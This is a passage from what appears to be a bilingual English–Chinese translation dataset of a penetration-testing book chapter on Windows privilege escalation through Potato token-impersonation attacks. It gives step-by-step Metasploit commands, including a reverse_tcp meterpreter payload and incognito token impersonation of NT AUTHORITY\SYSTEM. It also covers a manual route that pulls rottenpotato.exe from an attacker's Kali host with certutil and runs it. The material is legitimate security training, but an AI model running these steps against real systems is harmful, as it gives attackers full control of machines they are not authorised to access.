  type: TYPE_NORMAL
  zh: 现在我们了解了各种 Potato 攻击的工作原理，我们可以开始在目标系统上进行令牌冒充操作。
- en: Escalating privileges via a Potato attack
  id: totrans-119
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 通过土豆攻击提升权限
- en: In this section, we will be exploring the various tools and techniques that
    can be utilized to perform token impersonation via the Potato attack. As mentioned
    in the previous section, the success of Potato attacks will depend on the version
    of Windows the target is running and whether services such as WPAD are running
    or if NTLMv2 hashes are being used.
  id: totrans-120
  prefs: []
  type: TYPE_NORMAL
  zh: 在本节中，我们将探索可以通过 Potato 攻击进行令牌冒充的各种工具和技术。如前所述，Potato 攻击的成功将取决于目标运行的 Windows 版本以及是否运行诸如
    WPAD 等服务，或者是否使用 NTLMv2 哈希。
- en: 'We can begin the process by following the outlined procedures:'
  id: totrans-121
  prefs: []
  type: TYPE_NORMAL
  zh: 我们可以通过按照下列程序开始这个过程：
- en: 'The first step involves performing system enumeration to identify any potential
    privilege escalation vectors that can be exploited through the Potato attack.
    This can be done using an automated enumeration script; in this case, we will
    utilize the *Windows exploit suggester* script:'
  id: totrans-122
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 第一步是执行系统枚举，识别通过 Potato 攻击可以利用的潜在权限提升向量。这可以通过使用自动化枚举脚本来完成；在本例中，我们将使用 *Windows
    漏洞建议器* 脚本：
- en: '**./windows-exploit-suggester.py --database <Database>.xlsx --systeminfo <Systeminfo>.txt**'
  id: totrans-123
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '**./windows-exploit-suggester.py --database <Database>.xlsx --systeminfo <Systeminfo>.txt**'
- en: 'As highlighted in the following screenshot, this will output a list of potential
    privilege escalation vulnerabilities, in this case, we are only interested in
    Potato exploits that can lead to privilege escalation:'
  id: totrans-124
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 如下图所示，这将输出一份潜在的权限提升漏洞列表，在本例中，我们只关注能够导致权限提升的 Potato 漏洞：
- en: '![Figure 6.5 – Windows exploit suggester results'
  id: totrans-125
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '![图 6.5 – Windows 漏洞建议结果'
- en: '](Images/B17389_06_005.jpg)'
  id: totrans-126
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '](Images/B17389_06_005.jpg)'
- en: Figure 6.5 – Windows exploit suggester results
  id: totrans-127
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图 6.5 – Windows 漏洞建议结果
- en: 'In this example, we can identify a potential privilege escalation attack vector
    that can be exploited through the Hot Potato and Rotten Potato attacks:'
  id: totrans-128
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 在这个示例中，我们可以识别出一个潜在的权限提升攻击向量，可以通过 Hot Potato 和 Rotten Potato 攻击进行利用：
- en: '![Figure 6.6 – MS16-075 Metasploit module'
  id: totrans-129
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '![图 6.6 – MS16-075 Metasploit 模块'
- en: '](Images/B17389_06_006.jpg)'
  id: totrans-130
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '](Images/B17389_06_006.jpg)'
- en: Figure 6.6 – MS16-075 Metasploit module
  id: totrans-131
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图 6.6 – MS16-075 Metasploit 模块
- en: As shown in the preceding screenshot, additional research regarding the **MS16-075**
    exploit reveals a Metasploit module that we can use to perform the Potato attack
    automatically.
  id: totrans-132
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 如上图所示，关于 **MS16-075** 漏洞的进一步研究揭示了一个我们可以用来自动执行 Potato 攻击的 Metasploit 模块。
- en: 'We can load the module in Metasploit by running the following command:'
  id: totrans-133
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 我们可以通过运行以下命令在 Metasploit 中加载模块：
- en: '**use exploit/windows/local/ms16_075_reflection**'
  id: totrans-134
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '**use exploit/windows/local/ms16_075_reflection**'
- en: Ensure that you have put your **meterpreter** session in the background before
    loading the module.
  id: totrans-135
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 在加载模块之前，确保你已将 **meterpreter** 会话置于后台。
- en: 'After loading the module, we can explore the module options by running the
    following command in the Metasploit console:'
  id: totrans-136
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 加载模块后，我们可以通过在 Metasploit 控制台中运行以下命令来查看模块选项：
- en: '**show options**'
  id: totrans-137
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '**show options**'
- en: 'You will also need to specify the default shell to be used; in this case, we
    will be utilizing a **meterpreter** shell compatible with **x64**-based operating
    systems. This can be done by running the following command:'
  id: totrans-138
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 你还需要指定要使用的默认 shell；在本例中，我们将使用一个与**x64**架构操作系统兼容的**meterpreter** shell。可以通过运行以下命令来实现：
- en: '**set payload /windows/x64/meterpreter/reverse_tcp**'
  id: totrans-139
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '**set payload /windows/x64/meterpreter/reverse_tcp**'
- en: 'As highlighted in the following screenshot, the module options you will need
    to modify are **LHOST**, **LPORT**, and the **SESSION** ID. Additionally, the
    module options should also reflect the default shell we had specified in the previous
    step:'
  id: totrans-140
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 如下图所示，你需要修改的模块选项是 **LHOST**、**LPORT** 和 **SESSION** ID。此外，模块选项还应反映出我们在前一步中指定的默认
    shell：
- en: '![Figure 6.7 – Module options and default payload'
  id: totrans-141
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '![图 6.7 – 模块选项和默认负载'
- en: '](Images/B17389_06_007.jpg)'
  id: totrans-142
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '](Images/B17389_06_007.jpg)'
- en: Figure 6.7 – Module options and default payload
  id: totrans-143
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图6.7 – 模块选项和默认有效负载
- en: 'After configuring the module options, we can run the exploit module by running
    the following command:'
  id: totrans-144
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 配置模块选项后，我们可以通过运行以下命令来执行漏洞模块：
- en: '**run**'
  id: totrans-145
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '**run**'
- en: 'If the exploit is successful, you should get a new **meterpreter** session
    as highlighted in the following screenshot:'
  id: totrans-146
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 如果漏洞成功，您应该会看到如下截图所示的新**meterpreter**会话：
- en: '![Figure 6.8 – Exploit successful](Images/B17389_06_008.jpg)'
  id: totrans-147
  prefs:
  - PREF_IND
  type: TYPE_IMG
  zh: '![图6.8 – 漏洞成功](Images/B17389_06_008.jpg)'
- en: Figure 6.8 – Exploit successful
  id: totrans-148
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图6.8 – 漏洞成功
- en: 'The next step involves performing the impersonation process and can be automated
    using a built-in **meterpreter** module called **incognito**. The module can be
    loaded by running the following command:'
  id: totrans-149
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 下一步是执行模拟过程，可以使用内置的**meterpreter**模块**incognito**来自动化。可以通过运行以下命令来加载该模块：
- en: '**load incognito**'
  id: totrans-150
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '**load incognito**'
- en: 'If the module is successfully loaded, you should get a message similar to the
    one highlighted in the following screenshot:'
  id: totrans-151
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 如果模块成功加载，您应该会看到类似于以下截图所示的消息：
- en: '![Figure 6.9 – Loading incognito'
  id: totrans-152
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '![图6.9 – 加载incognito'
- en: '](Images/B17389_06_009.jpg)'
  id: totrans-153
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '](Images/B17389_06_009.jpg)'
- en: Figure 6.9 – Loading incognito
  id: totrans-154
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图6.9 – 加载incognito
- en: Note
  id: totrans-155
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 注意
- en: '**incognito** is a built-in **meterpreter** module that was originally a standalone
    application that allows you to impersonate user tokens after successful exploitation.'
  id: totrans-156
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '**incognito**是一个内置的**meterpreter**模块，最初是一个独立的应用程序，允许在成功利用漏洞后模拟用户令牌。'
- en: 'We can now use **incognito** to display a list of tokens available that we
    can impersonate. This can be done by running the following command in **meterpreter**:'
  id: totrans-157
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 现在我们可以使用**incognito**显示可用的令牌列表，我们可以模拟的令牌。可以在**meterpreter**中运行以下命令来完成：
- en: '**list_tokens -u**'
  id: totrans-158
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '**list_tokens -u**'
- en: 'As highlighted in the following screenshot, this will list all available user
    tokens that we can impersonate to elevate our privileges. In this case, we are
    able to identify the **NT AUTHORITY/SYSTEM** access token with the delegate security
    level:'
  id: totrans-159
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 如以下截图所示，这将列出我们可以模拟以提升权限的所有可用用户令牌。在这种情况下，我们能够识别出具有委托安全级别的**NT AUTHORITY/SYSTEM**访问令牌：
- en: '![Figure 6.10 – Listing tokens](Images/B17389_06_010.jpg)'
  id: totrans-160
  prefs:
  - PREF_IND
  type: TYPE_IMG
  zh: '![图6.10 – 列出令牌](Images/B17389_06_010.jpg)'
- en: Figure 6.10 – Listing tokens
  id: totrans-161
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图6.10 – 列出令牌
- en: 'The next step involves the actual impersonation. This can be done through **incognito**
    by running the following command:'
  id: totrans-162
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 下一步是进行实际的模拟。这可以通过运行以下命令，使用**incognito**来完成：
- en: '**impersonate_token "NT AUTHORITY\SYSTEM"**'
  id: totrans-163
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '**impersonate_token "NT AUTHORITY\SYSTEM"**'
- en: 'If the impersonation process is successful, you should receive a message similar
    to the one highlighted in the following screenshot:'
  id: totrans-164
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 如果模拟过程成功，您应该会收到类似以下截图所示的消息：
- en: '![Figure 6.11 – Successful impersonation'
  id: totrans-165
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '![图6.11 – 成功的模拟'
- en: '](Images/B17389_06_011.jpg)'
  id: totrans-166
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '](Images/B17389_06_011.jpg)'
- en: Figure 6.11 – Successful impersonation
  id: totrans-167
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图6.11 – 成功的模拟
- en: 'We can now verify the impersonation attack process by enumerating our current
    user and privileges. This can be done by running the following command in Meterpreter:'
  id: totrans-168
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 我们现在可以通过枚举当前用户和权限来验证模拟攻击过程。这可以通过在Meterpreter中运行以下命令来完成：
- en: '**getuid**'
  id: totrans-169
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '**getuid**'
- en: 'As highlighted in the following screenshot, we should now have **NT AUTHORITY/SYSTEM**
    privileges on the target system and should have successfully elevated our privileges:'
  id: totrans-170
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 如以下截图所示，我们现在应该在目标系统上拥有**NT AUTHORITY/SYSTEM**权限，并成功提升了我们的权限：
- en: '![Figure 6.12 – User enumeration'
  id: totrans-171
  prefs: []
  type: TYPE_NORMAL
  zh: '![图6.12 – 用户枚举'
- en: '](Images/B17389_06_012.jpg)'
  id: totrans-172
  prefs: []
  type: TYPE_NORMAL
  zh: '](Images/B17389_06_012.jpg)'
- en: Figure 6.12 – User enumeration
  id: totrans-173
  prefs: []
  type: TYPE_NORMAL
  zh: 图6.12 – 用户枚举
- en: Now that we have learned how to perform impersonation attacks automatically
    using Metasploit modules, we can also explore how to perform Potato attacks manually.
  id: totrans-174
  prefs: []
  type: TYPE_NORMAL
  zh: 现在我们已经学会了如何使用Metasploit模块自动执行模拟攻击，我们还可以探索如何手动执行Potato攻击。
- en: Manual escalation
  id: totrans-175
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 手动升级
- en: 'The manual escalation process will entail the use of exploit binaries that
    require manual compilation, transfer, and execution. After executing the exploit
    binary, we will utilize **meterpreter** modules such as **incognito** to list
    the available tokens and impersonate a privileged access token to elevate our
    privileges:'
  id: totrans-176
  prefs: []
  type: TYPE_NORMAL
  zh: 手动升级过程将涉及使用需要手动编译、传输和执行的漏洞二进制文件。在执行漏洞二进制文件后，我们将利用**meterpreter**模块，如**incognito**，列出可用的令牌，并模拟特权访问令牌以提升我们的权限：
- en: 'Like the previous section, the first step involves performing system enumeration
    to identify any potential privilege escalation vectors that can be exploited through
    the Potato attack. This can be done using an automated enumeration script, in
    this case, we will utilize the *Windows exploit suggester* script:'
  id: totrans-177
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 与前一部分类似，第一步是执行系统枚举，以识别可以通过 Potato 攻击利用的任何潜在权限提升漏洞。可以使用自动化枚举脚本来完成此操作，在本例中，我们将使用
    *Windows 漏洞建议器* 脚本：
- en: '**./windows-exploit-suggester.py --database <Database>.xlsx --systeminfo <Systeminfo>.txt**'
  id: totrans-178
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '**./windows-exploit-suggester.py --database <Database>.xlsx --systeminfo <Systeminfo>.txt**'
- en: 'As highlighted in the following screenshot, this will output a list of potential
    privilege escalation vulnerabilities. In this case, we are only interested in
    Potato exploits that can lead to privilege escalation:'
  id: totrans-179
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 如以下截图所示，这将输出一列潜在的权限提升漏洞。在此情况下，我们仅关心能够导致权限提升的 Potato 漏洞：
- en: '![Figure 6.13 – Windows exploit suggester results'
  id: totrans-180
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '![图 6.13 – Windows 漏洞建议器结果'
- en: '](Images/B17389_06_013.jpg)'
  id: totrans-181
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '](Images/B17389_06_013.jpg)'
- en: Figure 6.13 – Windows exploit suggester results
  id: totrans-182
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图 6.13 – Windows 漏洞建议器结果
- en: In this example, we can identify a potential privilege escalation attack vector
    that can be exploited through a Rotten Potato attack.
  id: totrans-183
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 在此示例中，我们可以识别出一个潜在的权限提升攻击向量，可以通过 Rotten Potato 攻击利用。
- en: We can navigate to the GitHub reference URL outlined in *Figure 6.13* to learn
    more about the exploit and how it can be used.
  id: totrans-184
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 我们可以导航到 *图 6.13* 中概述的 GitHub 参考 URL，了解更多关于该漏洞以及如何使用它的信息。
- en: 'As highlighted in the following screenshot, the GitHub repository provides
    us with the exploit source code and a pre-compiled executable that we can use:'
  id: totrans-185
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 如以下截图所示，GitHub 仓库为我们提供了漏洞源代码和一个预编译的可执行文件，我们可以使用它：
- en: '![Figure 6.14 – RottenPotato GitHub repository](Images/B17389_06_014.jpg)'
  id: totrans-186
  prefs:
  - PREF_IND
  type: TYPE_IMG
  zh: '![图 6.14 – RottenPotato GitHub 仓库](Images/B17389_06_014.jpg)'
- en: Figure 6.14 – RottenPotato GitHub repository
  id: totrans-187
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图 6.14 – RottenPotato GitHub 仓库
- en: 'The GitHub repository also provides us with usage procedures for the exploit
    and the requirements, as highlighted in the following screenshot:'
  id: totrans-188
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: GitHub 仓库还为我们提供了漏洞的使用流程和要求，如以下截图所示：
- en: '![Figure 6.15 – RottenPotato usage ](Images/B17389_06_015.jpg)'
  id: totrans-189
  prefs:
  - PREF_IND
  type: TYPE_IMG
  zh: '![图 6.15 – RottenPotato 使用情况](Images/B17389_06_015.jpg)'
- en: Figure 6.15 – RottenPotato usage
  id: totrans-190
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图 6.15 – RottenPotato 使用情况
- en: In this case, we will be using the pre-compiled executable; it is, however,
    recommended to analyze the source code and compile it manually to modify the parameters
    based on your requirements and avoid any security issues.
  id: totrans-191
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 在这种情况下，我们将使用预编译的可执行文件；但是，建议分析源代码并手动编译，以根据您的需求修改参数并避免任何安全问题。
- en: After downloading the pre-compiled exploit, we will need to transfer it to the
    target system. To transfer the **rottenpotato.exe** binary to our target, we will
    need to set up a web server on our Kali virtual machine that will be used to host
    the binary so that we can download it on the target system. This can be done by
    following the procedures outlined here.
  id: totrans-192
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 下载预编译漏洞后，我们需要将其传输到目标系统。为了将 **rottenpotato.exe** 二进制文件传输到我们的目标系统，我们需要在 Kali 虚拟机上设置一个
    web 服务器，用于托管该二进制文件，以便我们可以在目标系统上下载它。可以按照此处的步骤完成此操作。
- en: 'To set up a web server on our Kali virtual machine, we can utilize the **SimpleHTTPServer**
    Python module to serve the binary file. This can be done by running the following
    command in the directory where the **rottenpotato.exe** binary is stored:'
  id: totrans-193
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 为了在我们的 Kali 虚拟机上设置一个 web 服务器，我们可以利用 **SimpleHTTPServer** Python 模块来提供二进制文件。可以通过在存储
    **rottenpotato.exe** 二进制文件的目录中运行以下命令来完成此操作：
- en: '**sudo python -m SimpleHTTPServer 80**'
  id: totrans-194
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '**sudo python -m SimpleHTTPServer 80**'
- en: 'Alternatively, you can also utilize the Python3 **http.server** module by running
    the following command:'
  id: totrans-195
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 另外，您还可以通过运行以下命令使用 Python3 **http.server** 模块：
- en: '**sudo python3 -m http.server 80**'
  id: totrans-196
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '**sudo python3 -m http.server 80**'
- en: 'As highlighted in the following screenshot, **SimpleHTTPServer** will serve
    the files in the directory on the Kali virtual machine IP address on port **80**:'
  id: totrans-197
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 如以下截图所示，**SimpleHTTPServer** 将在 Kali 虚拟机的 IP 地址上通过端口 **80** 提供该目录中的文件：
- en: '![Figure 6.16 – SimpleHTTP server directory'
  id: totrans-198
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '![图 6.16 – SimpleHTTP 服务器目录'
- en: '](Images/B17389_06_016.jpg)'
  id: totrans-199
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '](Images/B17389_06_016.jpg)'
- en: Figure 6.16 – SimpleHTTP server directory
  id: totrans-200
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图 6.16 – SimpleHTTP 服务器目录
- en: 'To download the **rottenpotato.exe** binary onto the target system, we can
    utilize the **certutil** utility. Before we can download the binary, however,
    we need to navigate to a directory where we have read and write permissions. In
    this case, we will navigate to the current user''s desktop as illustrated in the
    following screenshot:'
  id: totrans-201
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 为了将**rottenpotato.exe**二进制文件下载到目标系统，我们可以使用**certutil**工具。然而，在下载二进制文件之前，我们需要导航到一个具有读写权限的目录。在这种情况下，我们将导航到当前用户的桌面，如下图所示：
- en: '![Figure 6.17 – Default user directory](Images/B17389_06_017.jpg)'
  id: totrans-202
  prefs:
  - PREF_IND
  type: TYPE_IMG
  zh: '![图 6.17 – 默认用户目录](Images/B17389_06_017.jpg)'
- en: Figure 6.17 – Default user directory
  id: totrans-203
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图 6.17 – 默认用户目录
- en: 'We can now use the **certutil** utility to download the binary from the Kali
    virtual machine to our target system. This can be done by running the following
    command on the target system:'
  id: totrans-204
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 现在我们可以使用**certutil**工具从Kali虚拟机下载二进制文件到我们的目标系统。可以通过在目标系统上运行以下命令来完成：
- en: '**certutil -urlcache -f http://<KALI-VM-IP>/rottenpotato.exe rottenpotato.exe**'
  id: totrans-205
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '**certutil -urlcache -f http://<KALI-VM-IP>/rottenpotato.exe rottenpotato.exe**'
- en: 'Alternatively, we can also use **meterpreter** to upload the **rottenpotato.exe**
    binary. This can be done by running the following command:'
  id: totrans-206
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 或者，我们也可以使用**meterpreter**上传**rottenpotato.exe**二进制文件。可以通过运行以下命令来实现：
- en: '**upload /<BINARY-LOCATION>/rottenpotato.exe**'
  id: totrans-207
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '**upload /<BINARY-LOCATION>/rottenpotato.exe**'
- en: 'The next step as per the usage procedures outlined is to load the **incognito**
    module in **meterpreter**. This can be done by running the following command:'
  id: totrans-208
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 根据使用程序的步骤，下一步是在**meterpreter**中加载**incognito**模块。可以通过运行以下命令来完成：
- en: '**load incognito**'
  id: totrans-209
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '**load incognito**'
- en: 'After loading the **incognito** module, we can now execute the **rottenpotato.exe**
    binary. This can be done by launching a shell session in **meterpreter** by running
    the following command:'
  id: totrans-210
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 在加载**incognito**模块后，我们现在可以执行**rottenpotato.exe**二进制文件。可以通过在**meterpreter**中启动shell会话，运行以下命令来完成：
- en: '**shell**'
  id: totrans-211
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '**shell**'
- en: 'After launching a shell session on the target, we can execute the **rottenpotato.exe**
    binary by running the following command:'
  id: totrans-212
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 在目标系统上启动shell会话后，我们可以通过运行以下命令来执行**rottenpotato.exe**二进制文件：
- en: '**.\rottenpotato.exe**'
  id: totrans-213
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '**.\rottenpotato.exe**'
- en: 'If the exploit is successful, you should receive a message like the one highlighted
    in the following screenshot:'
  id: totrans-214
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 如果漏洞利用成功，你应该会收到如下图所示的消息：
- en: '![Figure 6.18 – RottenPotato exploit successful'
  id: totrans-215
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '![图 6.18 – RottenPotato 漏洞利用成功'
- en: '](Images/B17389_06_018.jpg)'
  id: totrans-216
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '](Images/B17389_06_018.jpg)'
- en: Figure 6.18 – RottenPotato exploit successful
  id: totrans-217
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图 6.18 – RottenPotato 漏洞利用成功
- en: 'We can now terminate the shell session and return to the **meterpreter** session
    and list out the access tokens available for impersonation. This can be done by
    running the following command:'
  id: totrans-218
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 现在我们可以终止shell会话并返回到**meterpreter**会话，并列出可用于伪装的访问令牌。可以通过运行以下命令来实现：
- en: '**list_tokens -u**'
  id: totrans-219
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '**list_tokens -u**'
- en: 'As highlighted in the following screenshot, this will list out all available
    user tokens that we can impersonate to elevate our privileges. In this case, we
    are able to identify the **NT AUTHORITY/SYSTEM** access token with the delegate
    security level:'
  id: totrans-220
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 如下图所示，这将列出我们可以伪装的所有可用用户令牌，从而提升我们的权限。在这种情况下，我们能够识别出具有委托安全级别的**NT AUTHORITY/SYSTEM**访问令牌：
- en: '![Figure 6.19 – Listing tokens'
  id: totrans-221
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '![图 6.19 – 列出令牌'
- en: '](Images/B17389_06_019.jpg)'
  id: totrans-222
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '](Images/B17389_06_019.jpg)'
- en: Figure 6.19 – Listing tokens
  id: totrans-223
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图 6.19 – 列出令牌
- en: 'The next step involves the actual impersonation. This can be done through **incognito**
    by running the following command:'
  id: totrans-224
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 下一步是进行实际的伪装。可以通过**incognito**运行以下命令来完成：
- en: '**impersonate_token "NT AUTHORITY\SYSTEM"**'
  id: totrans-225
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '**impersonate_token "NT AUTHORITY\SYSTEM"**'
- en: 'If the impersonation process is successful, you should receive a message like
    the one highlighted in the following screenshot:'
  id: totrans-226
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 如果伪装过程成功，你应该会收到如下图所示的消息：
- en: '![Figure 6.20 – Successful impersonation'
  id: totrans-227
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '![图 6.20 – 伪装成功'
- en: '](Images/B17389_06_020.jpg)'
  id: totrans-228
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '](Images/B17389_06_020.jpg)'
- en: Figure 6.20 – Successful impersonation
  id: totrans-229
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图 6.20 – 伪装成功
- en: 'We can now verify the impersonation attack process by enumerating our current
    user and privileges. This can be done by running the following command in Meterpreter:'
  id: totrans-230
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 现在我们可以通过枚举当前用户和权限来验证伪装攻击过程。可以在Meterpreter中通过运行以下命令来实现：
- en: '**getuid**'
  id: totrans-231
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '**getuid**'
- en: 'As highlighted in the following screenshot, we should now have **NT AUTHORITY/SYSTEM**
    privileges on the target system and should have successfully elevated our privileges:'
  id: totrans-232
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 如下图所示，我们现在应该已经拥有**NT AUTHORITY/SYSTEM**权限，并且已经成功提升了我们的权限：
- en: '![Figure 6.21 – User enumeration'
  id: totrans-233
  prefs: []
  type: TYPE_NORMAL
  zh: '![图 6.21 – 用户枚举'
- en: '](Images/B17389_06_021.jpg)'
  id: totrans-234
  prefs: []
  type: TYPE_NORMAL
  zh: '](Images/B17389_06_021.jpg)'
- en: Figure 6.21 – User enumeration
  id: totrans-235
  prefs: []
  type: TYPE_NORMAL
  zh: 图 6.21 – 用户枚举
- en: We have now been able to elevate our privileges through token impersonation
    attacks both through Metasploit modules and manually through exploit binaries.
  id: totrans-236
  prefs: []
  type: TYPE_NORMAL
  zh: 现在，我们已经能够通过 Metasploit 模块和手动利用二进制漏洞，成功通过令牌伪装攻击提升我们的权限。
- en: Summary
  id: totrans-237
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 总结
- en: In this chapter, we got started with understanding how Windows access tokens
    work and the various security levels associated with them. We then looked at how
    to enumerate privileges on our target system through the use of automated and
    manual tools in order to identify whether it is vulnerable to a token impersonation
    attack. We then ended the chapter by taking an in-depth look at how to perform
    token impersonation attacks via the Potato attack both automatically and manually.
  id: totrans-238
  prefs: []
  type: TYPE_NORMAL
  zh: 在本章中，我们首先了解了 Windows 访问令牌是如何工作的，以及与之相关的各种安全级别。接着，我们探讨了如何通过使用自动化和手动工具在目标系统上枚举权限，以确定其是否容易受到令牌伪装攻击的影响。最后，我们通过深入分析如何通过
    Potato 攻击自动化和手动进行令牌伪装攻击，结束了本章内容。
- en: In the next chapter, we will look at how to search for stored credentials and
    hashes to elevate our privileges.
  id: totrans-239
  prefs: []
  type: TYPE_NORMAL
  zh: 在下一章中，我们将探讨如何搜索存储的凭证和哈希值，以提升我们的权限。
